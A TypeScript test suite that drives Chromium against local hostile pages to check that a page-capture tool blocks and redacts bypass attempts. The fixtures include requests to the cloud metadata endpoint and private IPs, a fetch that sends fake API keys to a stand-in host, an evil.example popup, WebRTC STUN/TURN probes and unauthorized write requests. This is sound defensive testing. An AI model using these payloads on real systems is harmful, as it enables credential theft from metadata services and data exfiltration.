// Issue #11: capture_page routes EVERY browser request through the replay policy. These tests drive real Chromium
// against a page that tries each bypass and assert it was blocked and recorded (redacted) as evidence.
import { createRequire } from "node:module";
import { existsSync, mkdtempSync, readdirSync, readFileSync } from "node:fs";
import http from "node:http";
import type { AddressInfo } from "node:net";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { PlaywrightCapturer, Redactor, redactHar, redactUrlsIn, renderWalkthrough, WalkthroughCore, type Sandbox } from "../src/core/index.js";
import { SB } from "./helpers.js";

const require = createRequire(import.meta.url);
const hasChromium = (() => { try { return existsSync(require("playwright").chromium.executablePath()); } catch { return false; } })();
if (process.env.REQUIRE_CHROMIUM && !hasChromium) throw new Error("REQUIRE_CHROMIUM is set but Chromium is not installed");

const SECRETS = { q: "QUERYtok3n9911", key: "APIKEYsecret4477", pw: "USERpw8822", lf: "sk-lf-PATHtoken5566", plain: "PLAINvalue7788" };
const sandbox: Sandbox = { up: async () => ({ exitCode: 0, output: "" }), down: async () => ({ exitCode: 0, output: "" }), exec: async () => ({ exitCode: 0, output: "" }), logs: async () => "" };

let srv: http.Server, port = 0;
const hits: string[] = [];
const methods: string[] = [];
let rtcPort = 0;
beforeAll(async () => {
  srv = http.createServer((req, res) => {
    hits.push(req.url ?? "");
    methods.push(`${req.method} ${req.url}`);
    const html = (b: string) => { res.writeHead(200, { "content-type": "text/html" }); res.end(b); };
    if (req.url === "/attack") return html(`<!doctype html><h1>attack page</h1>
<img id="meta" src="http://169.254.169.254/latest/meta-data/iam.png?token=${SECRETS.q}">
<script src="http://10.0.0.5/x.js"></script>
<iframe src="http://192.168.1.10/admin"></iframe>
<img src="http://not-allowed.example/${SECRETS.lf}/p.png">
<img src="/redir-meta">
<img src="/ok.png">
<script>
fetch("http://not-allowed.example/api?api_key=${SECRETS.key}&page=${SECRETS.plain}").catch(()=>{});
try { new WebSocket("ws://demo.local:${port}/ws"); } catch (e) {}
setTimeout(() => window.open("http://evil.example/popup"), 10);
</script>`);
    if (req.url === "/rtc") return html(`<h1>rtc page</h1><p id="r">rtc:pending</p><iframe srcdoc="<p>child</p>"></iframe><script>
const out = [];
for (const C of [window.RTCPeerConnection, window.webkitRTCPeerConnection, document.querySelector("iframe").contentWindow.RTCPeerConnection]) {
  try { const pc = new C({ iceServers: [{ urls: "stun:127.0.0.2:${rtcPort}" }, { urls: "turn:127.0.0.2:${rtcPort}?transport=tcp", username: "u", credential: "c" }] });
        pc.createDataChannel("x"); pc.createOffer().then((o) => pc.setLocalDescription(o)); out.push("OPEN"); }
  catch (e) { out.push("blocked"); }
}
document.getElementById("r").textContent = "rtc:" + out.join(",");
</script>`);
    if (req.url === "/writes") return html(`<h1>writes page</h1><iframe name="f"></iframe>
<form method="post" action="/w-form" target="f"><input name="a" value="1"></form>
<script>
document.forms[0].submit();
fetch("/w-post", { method: "POST", body: "x" }).catch(() => {});
fetch("/w-del", { method: "DELETE" }).catch(() => {});
fetch("/w-put", { method: "PUT", body: "y" }).catch(() => {});
fetch("/w-get").catch(() => {});
</script>`);
    if (req.url === "/ui") return html(`<h1>订单列表</h1><img src="http://169.254.169.254/latest/meta-data/ui.png">`);
    if (req.url === "/sw-page") return html(`<h1>sw page</h1><p id="r">sw:pending</p><script>
navigator.serviceWorker ? navigator.serviceWorker.register("/sw.js").then(() => { document.getElementById("r").textContent = "sw:REGISTERED"; }, (e) => { document.getElementById("r").textContent = "sw:rejected"; })
  : (document.getElementById("r").textContent = "sw:unavailable");
</script>`);
    if (req.url === "/sw.js") { res.writeHead(200, { "content-type": "text/javascript" }); return res.end("self.addEventListener('fetch', () => {});"); }
    if (req.url === "/redir-meta") { res.writeHead(302, { location: "http://169.254.169.254/latest/meta-data/" }); return res.end(); }
    if (req.url === "/ok.png" || /^\/r\d|^\/r-xhr/.test(req.url ?? "")) { res.writeHead(200, { "content-type": "image/png" }); return res.end(Buffer.from("89504e470d0a1a0a", "hex")); }
    if (req.url === "/rebind") return html(`<h1>rebind</h1>${Array.from({ length: 5 }, (_, i) => `<img src="/r${i}.png">`).join("")}<script>fetch("/r-xhr").catch(()=>{})</script>`);
    html("<h1>ok</h1>");
  });
  await new Promise<void>((r) => srv.listen(0, "127.0.0.1", r));
  port = (srv.address() as AddressInfo).port;
});
afterAll(() => srv.close());

function mk(resolver: (h: string) => Promise<string>, extraHosts: string[] = [], secrets: string[] = []) {
  const root = mkdtempSync(join(tmpdir(), "wt-block-"));
  const core = new WalkthroughCore({ root, sandboxFactory: () => sandbox, capturer: new PlaywrightCapturer(), redactor: new Redactor(secrets), resolver,
    // 169.254.169.254 / 10.x / 192.168.x are allowlisted on purpose so the IP rules (not the allowlist) must stop them.
    replay: { allowHosts: [`demo.local:${port}`, `rebind.local:${port}`, "169.254.169.254", "10.0.0.5", "192.168.1.10", ...extraHosts], allowCidrs: ["127.0.0.1/32"] } });
  return { core, root };
}
async function planned(core: WalkthroughCore) {
  const w = core.startWalkthrough({ title: "t", sandbox: SB });
  await core.planChecks(w.id, { goal: "g", checks: [{ id: "p", intent: "p", method: "ui", target: "x", expect: { type: "ui", value: { text: { contains: "page" } } }, severity_if_fail: "high" }] });
  return w.id;
}

describe("capture_page blocks every bypass (real Chromium)", () => {
  it.skipIf(!hasChromium)("img/script to metadata+private IPs, iframe, window.open, WebSocket, redirect to blocked host, userinfo: blocked + recorded + redacted", async () => {
    // Known fake secrets go into the Redactor (as a deployment would configure them). SECRETS.plain is deliberately
    // NOT: it must still be masked because every query value of a blocked URL is treated as a secret.
    const { core, root } = mk(async () => "127.0.0.1", [], [SECRETS.q, SECRETS.key, SECRETS.pw, SECRETS.lf]);
    const id = await planned(core);
    const before = hits.length;
    const evs = await core.capturePage(id, { checkId: "p", url: `http://demo.local:${port}/attack` });
    expect(evs.map((e) => e.path)).toEqual(expect.arrayContaining([expect.stringMatching(/\.har$/)]));
    const blockedEv = evs.find((e) => e.kind === "blocked")!;
    expect(blockedEv).toBeDefined();
    expect(blockedEv.type).toBe("blocked");
    const doc = JSON.parse(readFileSync(join(core.dir(id), blockedEv.path), "utf8"));
    const find = (re: RegExp) => doc.blocked.find((b: { url: string }) => re.test(b.url));
    expect(find(/169\.254\.169\.254\/latest\/meta-data\/iam/)).toMatchObject({ type: "image", reason: expect.stringMatching(/metadata/) });
    expect(find(/10\.0\.0\.5/)).toMatchObject({ type: "script", reason: expect.stringMatching(/private|not allowed|denied/) });
    expect(find(/192\.168\.1\.10/)).toMatchObject({ type: "document", reason: expect.stringMatching(/private|not allowed|denied/) }); // iframe
    expect(find(/not-allowed\.example\/api/)).toMatchObject({ type: "fetch", reason: expect.stringMatching(/allowlist/) });
    expect(find(/169\.254\.169\.254\/latest\/meta-data\/$/)).toMatchObject({ type: "image" }); // redirect hop of /redir-meta
    expect(find(/evil\.example\/popup/)).toBeDefined(); // the popup's navigation
    expect(doc.blocked.some((b: { type: string }) => b.type === "popup")).toBe(true);
    expect(doc.blocked.some((b: { type: string; url: string }) => b.type === "websocket" && /\/ws$/.test(b.url))).toBe(true);
    expect(doc.count).toBe(doc.blocked.length);
    // the allowed image was fetched by the pinned guard; none of the blocked ones reached any server
    const served = hits.slice(before);
    expect(served).toContain("/ok.png");
    expect(served.some((u) => /meta-data|userinfo|popup|\/ws/.test(u))).toBe(false);
    // redaction: no secret from any blocked URL lands in artifacts or the report
    const html = readFileSync(renderWalkthrough(core, id), "utf8");
    // every file under .walkthrough (state, command log, all evidence incl. HAR) + the report
    const all = readdirSync(join(root, ".walkthrough"), { recursive: true, withFileTypes: true }).filter((d) => d.isFile()).map((d) => readFileSync(join(d.parentPath, d.name)).toString("latin1")).join("\n") + html;
    for (const d of readdirSync(join(root, ".walkthrough"), { recursive: true, withFileTypes: true })) if (d.isFile()) { const t = readFileSync(join(d.parentPath, d.name)).toString("latin1"); for (const v of Object.values(SECRETS)) expect(t, `${d.name} leaks ${v}: ${t.slice(Math.max(0, t.indexOf(v) - 120), t.indexOf(v) + 20)}`).not.toContain(v); }
    for (const [k, v] of Object.entries(SECRETS)) expect(all, k).not.toContain(v);
    // count on the report's first screen + a table in the evidence
    expect(html).toMatch(new RegExp(`class="blocked-requests" data-blocked="${doc.count}">🛡 capture_page 已拦截 <b>${doc.count}</b> 个请求`));
    expect(html).toMatch(new RegExp(`class="blocked-table" data-ev="${blockedEv.id}" data-count="${doc.count}"`));
  }, 90_000);

  it.skipIf(!hasChromium)("DNS rebinding: host resolves to an allowed IP first and the metadata IP afterwards — the browser never reaches the second", async () => {
    const calls: string[] = [];
    let n = 0;
    const rebinding = async (h: string) => { calls.push(h); return h === "rebind.local" && n++ > 0 ? "169.254.169.254" : "127.0.0.1"; };
    const { core } = mk(rebinding);
    const id = await planned(core);
    const before = hits.length;
    const evs = await core.capturePage(id, { checkId: "p", url: `http://rebind.local:${port}/rebind` });
    // resolved ONCE per capture and pinned (our fetcher + Chromium's --host-resolver-rules)
    expect(calls.filter((h) => h === "rebind.local")).toHaveLength(1);
    const served = hits.slice(before);
    expect(served).toEqual(expect.arrayContaining(["/rebind", "/r0.png", "/r4.png", "/r-xhr"]));
    expect(evs.some((e) => e.kind === "blocked")).toBe(false);
    const log = readFileSync(join(core.dir(id), "commands.jsonl"), "utf8").trim().split("\n").map((l) => JSON.parse(l)).at(-1);
    expect(log.subresources.every((s: { ip: string }) => s.ip === "127.0.0.1")).toBe(true);
    expect(log.navigations.every((s: { ip: string }) => s.ip === "127.0.0.1")).toBe(true);
  }, 90_000);
});

describe("service workers", () => {
  it.skipIf(!hasChromium)("a page cannot register a service worker during capture_page (serviceWorkers: 'block')", async () => {
    // localhost is a secure context, so registration WOULD succeed without the block (checked by flipping it).
    const { core } = mk(async () => "127.0.0.1", [`localhost:${port}`]);
    const id = await planned(core);
    const before = hits.length;
    const evs = await core.capturePage(id, { checkId: "p", url: `http://localhost:${port}/sw-page` });
    const text = readFileSync(join(core.dir(id), evs.find((e) => e.kind === "http")!.path), "utf8");
    expect(text).toMatch(/sw:(rejected|unavailable)/);
    expect(text).not.toContain("sw:REGISTERED");
    expect(hits.slice(before)).not.toContain("/sw.js");
    const b = evs.find((e) => e.kind === "blocked")!;
    expect(JSON.parse(readFileSync(join(core.dir(id), b.path), "utf8")).blocked).toEqual(expect.arrayContaining([expect.objectContaining({ type: "serviceworker", url: expect.stringMatching(/\/sw\.js$/) })]));
  }, 90_000);
});

describe("WebRTC", () => {
  it.skipIf(!hasChromium)("RTCPeerConnection (top frame, webkit alias, child frame) throws, is recorded, and nothing reaches a denied IP over UDP or TCP", async () => {
    const dgram = await import("node:dgram");
    const net = await import("node:net");
    let udp = 0, tcp = 0;
    const u = dgram.createSocket("udp4");
    u.on("message", () => { udp++; });
    await new Promise<void>((r) => u.bind(0, "127.0.0.2", r));
    rtcPort = u.address().port;
    const t = net.createServer((c) => { tcp++; c.destroy(); });
    await new Promise<void>((r) => t.listen(rtcPort, "127.0.0.2", r));
    try {
      const { core } = mk(async () => "127.0.0.1");
      const id = await planned(core);
      const evs = await core.capturePage(id, { checkId: "p", url: `http://demo.local:${port}/rtc` });
      await new Promise((r) => setTimeout(r, 1500)); // ICE gathering would have sent by now
      const text = readFileSync(join(core.dir(id), evs.find((e) => e.kind === "http")!.path), "utf8");
      expect(text).toContain("rtc:blocked,blocked,blocked");
      expect(text).not.toContain("OPEN");
      expect(udp).toBe(0);
      expect(tcp).toBe(0);
      const b = evs.find((e) => e.type === "blocked")!;
      const list = JSON.parse(readFileSync(join(core.dir(id), b.path), "utf8")).blocked as { type: string; url: string }[];
      expect(list.filter((x) => x.type === "webrtc").length).toBeGreaterThanOrEqual(3);
      expect(list.find((x) => x.type === "webrtc")!.url).toMatch(/RTCPeerConnection stun:127\.0\.0\.2/);
    } finally { u.close(); t.close(); }
  }, 90_000);
});

describe("read-only by default", () => {
  it.skipIf(!hasChromium)("form POST and fetch POST/PUT/DELETE are blocked + recorded and never reach the server; GET still works", async () => {
    const { core } = mk(async () => "127.0.0.1");
    const id = await planned(core);
    const before = methods.length;
    const evs = await core.capturePage(id, { checkId: "p", url: `http://demo.local:${port}/writes` });
    const seen = methods.slice(before);
    expect(seen).toContain("GET /w-get");
    expect(seen.filter((m) => !m.startsWith("GET ") && !m.startsWith("HEAD "))).toEqual([]);
    expect(seen.some((m) => m.includes("/w-"))).toBe(true);
    expect(seen.filter((m) => /\/w-(form|post|del|put)/.test(m))).toEqual([]);
    const b = evs.find((e) => e.type === "blocked")!;
    const list = JSON.parse(readFileSync(join(core.dir(id), b.path), "utf8")).blocked as { method: string; url: string; reason: string }[];
    for (const [m, path] of [["POST", "/w-form"], ["POST", "/w-post"], ["DELETE", "/w-del"], ["PUT", "/w-put"]]) {
      expect(list.find((x) => x.method === m && x.url.endsWith(path)), `${m} ${path}`).toMatchObject({ reason: expect.stringMatching(/read-only/) });
    }
  }, 90_000);
});

describe("blocked evidence is its own type", () => {
  it.skipIf(!hasChromium)("type 'blocked' (not response); ui text checks ignore it — it can neither satisfy nor fail them", async () => {
    const { core } = mk(async () => "127.0.0.1");
    const w = core.startWalkthrough({ title: "t", sandbox: SB });
    const ui = (id: string, contains: string) => ({ id, intent: id, method: "ui" as const, target: "x", expect: { type: "ui" as const, value: { text: { contains } } }, severity_if_fail: "high" as const });
    await core.planChecks(w.id, { goal: "g", checks: [ui("page-text", "订单列表"), ui("blocked-text", "meta-data")] });
    const a = await core.capturePage(w.id, { checkId: "page-text", url: `http://demo.local:${port}/ui` });
    const blockedEv = a.find((e) => e.kind === "blocked")!;
    expect(blockedEv.type).toBe("blocked");
    expect(a.filter((e) => e.type === "response").map((e) => e.kind)).toEqual(["http"]);
    // page text present + one blocked request: submitting ALL capture evidence passes (blocked JSON is not judged)
    const pt = await core.evaluateCheck(w.id, { checkId: "page-text", evidenceIds: a.map((e) => e.id) });
    expect(pt.status, JSON.stringify(pt)).toBe("pass");
    // text that appears ONLY in the blocked record (its URL) must not satisfy a ui text check
    const b = await core.capturePage(w.id, { checkId: "blocked-text", url: `http://demo.local:${port}/ui` });
    const onlyBlocked = await core.evaluateCheck(w.id, { checkId: "blocked-text", evidenceIds: [b.find((e) => e.type === "blocked")!.id] });
    expect(onlyBlocked.status).not.toMatch(/^pass/);
    const all = await core.evaluateCheck(w.id, { checkId: "blocked-text", evidenceIds: b.map((e) => e.id) });
    expect(all.status).not.toMatch(/^pass/);
  }, 90_000);
});

describe("blocked-request redaction (unit)", () => {
  it("secret query params, userinfo and token patterns are masked in reasons", () => {
    const r = redactUrlsIn(`host http://u:${SECRETS.pw}@x.example/a?token=${SECRETS.q}&page=2 is not allowed`, new Redactor([]));
    expect(r).not.toContain(SECRETS.pw);
    expect(r).not.toContain(SECRETS.q);
    expect(r).toContain("page=2");
  });
  it("redactHar runs URL redaction over response bodies (plain and base64 text) and post data", () => {
    const body = `<img src="http://x.example/a.png?token=BODYtok112233&id=7">`;
    const har = JSON.stringify({ log: { entries: [
      { request: { method: "GET", url: "http://h/", headers: [] }, response: { status: 200, headers: [], content: { mimeType: "text/html", text: body } } },
      { request: { method: "POST", url: "http://h/p", headers: [], postData: { text: `go=http://y.example/?access_token=POSTtok445566` } }, response: { status: 200, headers: [], content: { mimeType: "text/html", encoding: "base64", text: Buffer.from(body).toString("base64") } } },
    ] } });
    const out = redactHar(har, new Redactor([]));
    const decoded = out + Buffer.from(JSON.parse(out).log.entries[1].response.content.text, "base64").toString();
    expect(decoded).not.toContain("BODYtok112233");
    expect(decoded).not.toContain("POSTtok445566");
    expect(decoded).toContain("id=7");
  });
});
